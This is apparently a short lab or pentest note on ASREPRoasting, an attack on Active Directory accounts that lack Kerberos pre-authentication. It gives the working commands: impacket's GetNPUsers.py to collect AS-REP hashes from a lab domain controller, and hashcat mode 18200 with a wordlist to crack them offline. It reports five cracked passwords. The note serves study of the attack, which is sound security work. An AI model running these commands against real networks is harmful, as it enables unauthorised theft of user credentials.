
- **ASREPRoasting** is an attack that affects users that do not require Kerberos pre-auth. 
- When Kerberos pre-auth is not required for a user, anyone (authenticated user) with access to the local network can send an **AS_REQ** request for that user and receive an **AS_REP** response. 
- The **AS_REP** response contains a message encrypted with the key generated by the user's password.
- An attacker who intercepts this message can crack the user's password offline and obtain the password.

To obtain the list of users which don't require Kerberos pre-auth, type the following command:

`python3 ~/Tools/impacket/examples/GetNPUsers.py -dc-ip 192.168.0.4 mon3l.local/test -format hashcat -outputfile hashes`

![[Pasted image 20231121183148.png]]

We can crack the hashes of users who do not require **Kerberos pre-auth** with hashcat.
`hashcat -m 18200 hashes ~/Tools/Wordlist/rockyou.txt`

As a result of the process, we captured the passwords of 5 users who did not require Kerberos preauth.

![[Screenshot 2023-11-21 at 18.35.11.png]]
